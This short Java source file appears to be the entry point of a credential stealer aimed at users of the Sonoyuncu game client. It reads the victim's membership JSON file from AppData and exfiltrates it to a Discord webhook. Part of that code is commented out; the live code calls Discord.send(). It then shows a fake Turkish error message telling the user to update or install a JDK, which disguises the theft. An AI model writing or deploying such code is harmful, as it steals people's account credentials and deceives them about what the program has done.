package wrap.dev;

import java.awt.AWTException;
import java.io.File;
import java.io.IOException;

import javax.swing.JOptionPane;

import org.json.JSONException;

import wrap.dev.discord.Discord;


public class Main {

	public static void main(String[] args) throws JSONException, AWTException {
		// TODO Auto-generated method stub
		/*String membershipPath = "C:\\Users\\" + System.getProperty("user.name") + "\\Appdata\\Roaming\\.sonoyuncu\\sonoyuncu-membership.json";
		try {
			DiscordWebhook discordrequest = new DiscordWebhook(DiscordWebhook.webhook, "Sonoyuncu Account Has Been  Stealed", MemberShipReader.readMembershipJson(new File(membershipPath)).toJsonObject().toString(), "qweqw", "Red");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/ 
		Discord.send();
	new JOptionPane().showMessageDialog(null, "Birþeyler Ters Gitti.. Lütfen Son Sürümü Kullanmayý Dene Veya JDK U 291 Kurulumunu Yap !", null, 0);

		
		
		
	}

}
